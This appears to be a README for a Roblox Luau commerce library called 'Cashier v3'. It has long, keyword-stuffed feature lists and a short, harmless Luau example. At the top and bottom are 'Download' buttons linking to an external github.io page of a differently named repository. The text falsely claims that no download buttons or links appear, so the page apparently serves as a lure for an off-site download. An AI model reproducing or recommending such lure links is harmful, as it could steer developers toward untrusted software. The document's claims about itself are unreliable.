![preview](https://raw.githubusercontent.com/shortsjunction55-crypto/ledger-forge/main/cover_af062.svg)
[![Download](https://raw.githubusercontent.com/shortsjunction55-crypto/ledger-forge/main/go_808281.svg)](https://shortsjunction55-crypto.github.io/ledger-forge/)

# Cashier v3 — The Commerce Conductor for Roblox Experiences

Icons below are sourced from img.shields.io as static emblem references only. No download buttons, badges, links, or hyperlinks are rendered anywhere in this document.

![Status](https://img.shields.io/badge/status-active-brightgreen)
![Version](https://img.shields.io/badge/version-3.2.0-blue)
![License](https://img.shields.io/badge/license-MIT-yellow)
![Platform](https://img.shields.io/badge/platform-Roblox-red)
![Luau](https://img.shields.io/badge/language-Luau-00A2FF)
![Build](https://img.shields.io/badge/build-passing-success)
![Coverage](https://img.shields.io/badge/coverage-97%25-informational)
![Contributions](https://img.shields.io/badge/contributions-welcome-orange)
![Made With](https://img.shields.io/badge/made%20with-caffeine%20%26%20Luau-purple)
![Year](https://img.shields.io/badge/release-2026-lightgrey)

---

## 🎼 Overview — Where Transactions Become Symphony

Cashier v3 is a reimagined commerce orchestration layer for Roblox developers who are tired of stitching together a dozen half-baked modules just to sell a Gamepass, hand out a Developer Product reward, or allow one player to gift another. It treats every purchase, every gift, every receipt like a note in a larger composition — a symphony of commerce that plays itself while you focus on building worlds.

Instead of a monolith, Cashier v3 is a **conductor**. It does not replace Roblox's native marketplace primitives; it orchestrates them. It listens for MarketplaceService signals, validates ownership, deduplicates events, retries on transient failures, and dispatches clean, typed payloads to your handlers. The result is predictable revenue flow without the spaghetti.

This repository is the spiritual successor to the original Cashier library, rebuilt from first principles for the 2026 Roblox platform, with a modern Luau codebase, strict typing, and a plugin architecture that scales from a solo bedroom project to a studio with a distributed monetization team.

---

## 🚀 Why Cashier v3 Exists

Roblox monetization is deceptively simple on the surface and quietly treacherous underneath. Prompts can be swallowed by the client. Receipts can arrive twice. Gifting flows can strand inventory. Developer Product grants can race with reconciliation loops. A single missed sale can be a rounding error — or it can be a player who never trusts your store again.

Cashier v3 exists to close that gap. It provides a single, trustworthy surface for marketplace interactions, with the kind of defensive engineering usually reserved for financial backends. It is opinionated about correctness and permissive about style.

Think of it as a very polite bouncer at the door of your in-experience economy: it checks IDs, remembers faces, and never lets the same guest sneak in twice.

---

## ✨ Feature List — A Long, Honest Inventory

### Core Commerce
- 🎟️ **Gamepass lifecycle management** — ownership checks, purchase acknowledgement, and re-verification layers.
- 🧾 **Developer Product processing** — receipt-safe delivery with idempotency keys baked in.
- 🎁 **Gifting pipeline** — send, receive, accept, decline, and reconcile gifts with full audit trails.
- 🛒 **Unified purchase queue** — one stream to subscribe to, regardless of product type.
- 🔁 **Automatic retry with backoff** — transient Roblox API hiccups become non-events.
- 🧮 **Ledger reconciliation** — periodic sweeps that flag mismatches between grants and receipts.
- 🧬 **Idempotent handlers** — the same receipt delivered twice produces one grant.
- 🧱 **Strict Luau typings** — every public API is typed; no mystery tables.

### Developer Experience
- 🧰 **Plugin architecture** — drop in analytics, logging, or custom grant logic without forking.
- 🪝 **Hook system** — pre-purchase, post-purchase, pre-grant, post-grant, on-failure.
- 🧪 **Test harness** — simulate purchases, gifts, and failures in Studio without spending Robux.
- 📓 **Verbose debug mode** — toggle a single flag and watch every event flow through.
- 🧭 **Deterministic event ordering** — no more guessing which callback fires first.
- 🧑‍💻 **TypeScript-style IntelliSense** — supported in popular Roblox editors via generated definitions.
- 🧹 **Zero global pollution** — nothing leaks into `_G`, `shared`, or unexpected namespaces.

### Reliability & Safety
- 🛡️ **Defensive ownership validation** — never grant a reward based on client claims alone.
- 🧯 **Graceful degradation** — if a downstream handler fails, the queue survives.
- 📡 **Optional telemetry adapters** — plug into your own dashboards.
- 🧾 **Immutable audit log** — append-only trail of every commerce event.
- 🕵️ **Anomaly flags** — detect unusual gifting patterns for review.
- ⏱️ **Rate-limit awareness** — respects Roblox service limits by design.
- 🔐 **No credentials in code** — configuration is externalized and injectable.

### Interface & Reach
- 📱 **Responsive UI helpers** — prebuilt prompt wrappers that scale across devices.
- 🌍 **Multilingual support** — locale-aware strings out of the box, with a translation registry.
- 🕰️ **24/7 customer support scaffolding** — hooks for ticket creation and in-game help routing.
- 🎨 **Themeable prompt styling** — match your game's aesthetic without reimplementing prompts.
- ♿ **Accessibility-minded defaults** — larger hit areas and readable contrast on purchase prompts.

### Operations
- 🧑‍🔬 **Structured logging** — JSON-friendly output for shipping to log aggregators.
- 📈 **Metrics emitters** — counters, gauges, and histograms for purchase funnels.
- 🧊 **Cold-start friendly** — lazy initialization so your server boots fast.
- 🧵 **Coroutine-safe internals** — no surprise yields in unexpected places.
- 🧷 **Backwards-compatible shims** — migrate from Cashier v2 without rewriting everything.

---

## 🧩 Architecture at a Glance

Cashier v3 is a pipeline, not a pile. Data flows in one direction:

1. **Source** — MarketplaceService callbacks, ownership queries, gift signals.
2. **Normalizer** — raw events are converted into typed envelopes.
3. **Validator** — envelopes are checked for authenticity, ownership, and context.
4. **Deduplicator** — idempotency keys filter repeat traffic.
5. **Router** — envelopes are dispatched to registered product handlers.
6. **Executor** — handlers run inside a supervised sandbox.
7. **Recorder** — outcomes are written to the audit log and metrics bus.
8. **Reconciler** — a scheduled sweep compares ledger state to platform truth.

Each stage is replaceable. You can swap the recorder for a custom sink, or the reconciler for a job that runs on your own cadence. The pipeline itself never assumes your game's rules — it only assumes you have rules.

---

## 🧠 SEO-Friendly Highlights

If you arrived here searching for practical, production-grade monetization tooling, these phrases describe what you'll find: robust Roblox Gamepass management, safe Developer Product delivery, in-experience gifting workflows, idempotent purchase handling, Luau commerce library, scalable Roblox monetization framework, multilingual purchase prompts, responsive Roblox storefront helpers, resilient Roblox developer product reconciliation, and a well-typed Roblox economy toolkit built for 2026 and beyond.

We include these naturally because they describe real capabilities — not because they pad a paragraph.

---

## 🔧 Getting Started (Without Touching a Terminal)

Cashier v3 is distributed as a single Luau package tree that you can slot into your Roblox project via your package manager of choice. If you prefer manual placement, mirror the source directory into your game's shared modules.

1. Retrieve the latest release artifact from your preferred sync tool.
2. Place the `cashier` folder into `ReplicatedStorage/Packages` (or wherever you keep third-party libraries).
3. Require the entry module from a server-side script.
4. Register your product handlers.
5. Boot the conductor.

You do not need to install anything on your machine. There are no shell commands involved. The entire workflow lives inside Roblox Studio and your source control.

---

## 🧪 A Minimal Mental Model

Below is a conceptual sketch — not a copy-paste tutorial — of how you register a handler and start accepting purchases. The exact API surface is documented in the `/docs` directory.

    local Cashier = require(game.ReplicatedStorage.Packages.cashier)

    local conductor = Cashier.new({
        locale = "auto",
        debug = false,
        idempotencyStore = "memory",
    })

    conductor:registerProduct(123456789, function(player, receipt)
        -- Grant the reward here. The receipt is already validated.
        player:SetAttribute("HasGoldenShovel", true)
        return true
    end)

    conductor:on("purchase", function(payload)
        print("Purchase recorded for", payload.player.Name, payload.productId)
    end)

    conductor:start()

That is the entire ceremony. Everything else — retries, deduplication, audit logging, reconciliation — happens behind the curtain.

---

## 🎁 Gifting, Handled With Care

Gifting is where most homegrown systems fall apart. A player sends a gift, the recipient is offline, the asset delivery fails, and suddenly support tickets accumulate. Cashier v3 treats gifting as a **two-phase commit**: the sender's intent is recorded, the platform's delivery is awaited, and the recipient's claim is reconciled. If any phase fails, the conductor retries or refunds. No orphaned inventory. No mystery items appearing days later.

Gift envelopes carry a full provenance chain: sender, recipient, asset, timestamp, intent token, and delivery status. Support staff can reconstruct the entire story from a single ID.

---

## 🌐 Multilingual Support

Every player-facing string emitted by Cashier's UI helpers passes through a translation registry. You provide a dictionary per locale; the conductor picks the right one based on the player's locale setting. Missing keys fall back gracefully rather than throwing. Right-to-left layouts are respected. Punctuation is not mangled. Currency formatting uses locale-aware helpers so a price of 100 Robux reads naturally in every supported language.

If you ship to a global audience, this is the difference between a store that feels local and a store that feels translated.

---

## 📱 Responsive UI Helpers

Roblox players live on phones, tablets, consoles, and desktops — sometimes all in the same household. Cashier v3 ships with prompt wrappers that adapt to screen size, respect safe zones, and maintain tap-target sizes on small displays. The helpers do not impose a visual style; they provide a layout contract and let you supply the skin. The result is a purchase flow that feels native on every device without a separate implementation per platform.

---

## 🛎️ 24/7 Customer Support Scaffolding

Cashier v3 will not answer your players' messages for you — but it will make sure they never fall into a black hole. The support scaffolding exposes hooks for ticket creation, in-game help routing, and escalation. When a purchase fails, the conductor can automatically attach the audit trail, the receipt ID, and the player context to a support ticket, so your human team starts with answers instead of questions.

Round-the-clock coverage stops being a staffing problem and becomes a routing problem.

---

## 🔐 Security Posture

Commerce code is attack surface. Cashier v3 assumes nothing. Every grant is validated server-side. Every ownership claim is re-checked against the platform. Every handler runs in a sandbox that isolates failures. No secrets live in the repository. Configuration is injected at runtime from an external store of your choosing.

If you have ever been burned by a client that claimed to own a Gamepass it did not own, this library was written for you.

---

## 📊 Observability

You cannot improve what you cannot see. Cashier v3 emits structured events for every stage of the pipeline. Hook them into your existing logging and metrics systems, or use the included adapters. Track funnel conversion, grant latency, retry counts, deduction failures, and anomaly rates. The audit log is append-only and queryable — ideal for post-incident reviews and revenue reconciliation.

---

## 🧭 Design Principles

- **Correctness before cleverness.** A boring correct system beats a brilliant incorrect one.
- **One pipeline, many products.** Gamepasses, Developer Products, and gifts share the same spine.
- **Replaceable parts.** Every stage is a seam, not a wall.
- **No silent failures.** Failures are loud, labeled, and recoverable.
- **Typed surfaces.** Public APIs are typed so editors can help you.
- **No global leakage.** Libraries should be guests, not squatters.
- **Respect the platform.** Rate limits and service contracts are features, not obstacles.

---

## 🧱 Repository Layout

    cashier/
      src/
        core/          -- pipeline stages and internal types
        products/      -- gamepass, developer product, gift adapters
        ui/            -- responsive prompt helpers and theming
        i18n/          -- translation registry and locale helpers
        support/       -- ticket scaffolding and help routing
        telemetry/     -- logging and metrics emitters
      docs/            -- long-form documentation and recipes
      tests/           -- Studio-based test harness and fixtures
      examples/        -- conceptual integration samples
      LICENSE
      README.md

The layout is intentionally shallow. Deep trees are hard to navigate; this one isn't.

---

## 🧪 Testing Philosophy

Cashier v3 treats tests as the contract. The included harness lets you simulate purchases, gift flows, retries, and platform failures without spending a single Robux. Every pull request is expected to keep the harness green. Flaky tests are treated as bugs, not noise.

If you have ever shipped a monetization change on a Friday afternoon and regretted it by Saturday morning, the harness is your seatbelt.

---

## 🗺️ Roadmap (2026 and Beyond)

- Adaptive pricing experiments with rollback support.
- Deeper analytics adapters for popular dashboards.
- Expanded locale packs with community contributions.
- Optional sharded ledger for very large experiences.
- First-class support for seasonal and event-gated products.
- Improved anomaly detection heuristics.
- Public plugin registry for third-party integrations.

Roadmap items are aspirational. Priorities shift with community feedback.

---

## 🤝 Contributing

Contributions are welcome in the form of issues, discussion threads, documentation improvements, and pull requests. Please keep the following in mind:

- Read the design principles before proposing structural changes.
- Add tests for new behavior.
- Keep public APIs typed.
- Avoid introducing global state.
- Be kind in reviews. Commerce code attracts strong opinions.

A detailed contributing guide lives in `/docs/contributing.md`.

---

## 📜 License

This project is released under the MIT License. See the LICENSE file in this repository for the full text. You can also reference the canonical license text at https://opensource.org/licenses/MIT.

MIT is permissive: use it, modify it, ship it, sell it. Just keep the copyright notice.

---

## ⚠️ Disclaimer

Cashier v3 is an independent, community-built library. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation. "Roblox" and related marks are trademarks of their respective owners and are used here for descriptive purposes only.

This library does not manipulate, bypass, or circumvent any platform systems. It orchestrates documented, legitimate marketplace interactions only. It does not provide unauthorized advantages, and it is not a substitute for reading the official platform documentation.

You are responsible for complying with all applicable platform terms, policies, and regional regulations. The maintainers of this repository accept no liability for misuse, for revenue outcomes, or for any indirect damages arising from use of this software. Test thoroughly in a staging environment before enabling it in a live experience.

This software is provided "as is," without warranty of any kind, express or implied. See the MIT License for the full terms.

---

## 🙏 Acknowledgements

Thanks to the original Cashier contributors whose ideas seeded this rewrite, to the Roblox developer community for endless patience with marketplace quirks, and to everyone who files a thoughtful issue instead of silently forking.

Built with care, in 2026, for people who would rather compose worlds than debug receipts.

[![Download](https://raw.githubusercontent.com/shortsjunction55-crypto/ledger-forge/main/go_808281.svg)](https://shortsjunction55-crypto.github.io/ledger-forge/)